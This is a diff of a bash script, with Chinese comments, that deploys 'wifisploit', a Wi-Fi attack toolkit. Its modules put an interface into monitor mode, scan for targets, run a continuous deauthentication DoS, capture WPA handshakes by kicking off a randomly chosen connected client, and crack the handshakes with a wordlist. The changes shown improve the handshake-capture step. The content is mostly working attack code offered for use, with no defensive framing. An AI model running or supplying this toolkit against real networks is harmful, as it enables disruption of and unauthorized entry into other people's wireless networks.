@@ -3,7 +3,7 @@
 # 创建目录结构
 mkdir -p wifisploit/modules
 
-# 复制脚本到相应目录
+# 创建 set_monitor_mode.sh
 cat << 'EOF' > wifisploit/modules/set_monitor_mode.sh
 #!/bin/bash
 
@@ -28,6 +28,7 @@ echo "$INTERFACE 已设置为监听模式 $MONITOR_INTERFACE"
 echo $MONITOR_INTERFACE > /tmp/current_monitor_interface
 EOF
 
+# 创建 scan_networks.sh
 cat << 'EOF' > wifisploit/modules/scan_networks.sh
 #!/bin/bash
 
@@ -62,6 +63,7 @@ echo $TARGET_CHANNEL > /tmp/current_target_channel
 echo "已选择目标网络: BSSID=$TARGET_BSSID, 频道=$TARGET_CHANNEL"
 EOF
 
+# 创建 dos_attack.sh
 cat << 'EOF' > wifisploit/modules/dos_attack.sh
 #!/bin/bash
 
@@ -77,6 +79,7 @@ echo "开始对目标网络进行Dos攻击..."
 aireplay-ng --deauth 0 -a $TARGET_BSSID $MONITOR_INTERFACE
 EOF
 
+# 创建 capture_handshake.sh
 cat << 'EOF' > wifisploit/modules/capture_handshake.sh
 #!/bin/bash
 
@@ -89,17 +92,35 @@ if [ -z "$MONITOR_INTERFACE" ] || [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNE
   exit 1
 fi
 
-echo "开始对目标网络进行监视并捕获握手包..."
+echo "开始对目标网络进行监视以查找连接的设备..."
+airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write capture --output-format csv $MONITOR_INTERFACE &
+
+AIRODUMP_PID=$!
+
+sleep 10  # 监视10秒以查找连接的设备
+
+kill $AIRODUMP_PID
+
+# 检查是否找到连接的设备
+CLIENT_MACS=$(awk -F, '/Station MAC/ {found=1} found && $1 ~ /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print $1}' capture-01.csv)
+
+if [ -z "$CLIENT_MACS" ]; then
+  echo "未找到连接到目标网络的设备。"
+  exit 1
+fi
+
+# 随机选择一台设备进行踢出
+CLIENT_MAC=$(echo "$CLIENT_MACS" | shuf -n 1)
+
+echo "踢出目标网络中的设备 $CLIENT_MAC 以获取握手包..."
+aireplay-ng --deauth 5 -a $TARGET_BSSID -c $CLIENT_MAC $MONITOR_INTERFACE
+
+# 继续监视目标网络以捕获握手包
 airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write capture $MONITOR_INTERFACE &
 
 AIRODUMP_PID=$!
 
-sleep 5
-
-echo "踢出目标网络中的一台设备以获取握手包..."
-aireplay-ng --deauth 5 -a $TARGET_BSSID $MONITOR_INTERFACE
-
-sleep 10
+sleep 10  # 继续监视10秒
 
 kill $AIRODUMP_PID
 
@@ -112,6 +133,7 @@ else
 fi
 EOF
 
+# 创建 crack_handshake.sh
 cat << 'EOF' > wifisploit/modules/crack_handshake.sh
 #!/bin/bash
 
@@ -138,6 +160,7 @@ echo "开始使用$DICTIONARY_PATH进行暴力破解..."
 aircrack-ng -w $DICTIONARY_PATH -b $TARGET_BSSID $CAPTURE_FILE
 EOF
 
+# 创建 show_target.sh
 cat << 'EOF' > wifisploit/modules/show_target.sh
 #!/bin/bash
 
@@ -151,6 +174,7 @@ else
 fi
 EOF
 
+# 创建 wifisploit.sh
 cat << 'EOF' > wifisploit/wifisploit.sh
 #!/bin/bash
 
@@ -215,4 +239,3 @@ chmod +x wifisploit/wifisploit.sh
 
 echo "wifisploit 工具已成功部署。"
 echo "使用方法：进入 wifisploit 目录并运行 ./wifisploit.sh 进入交互模式。"
-
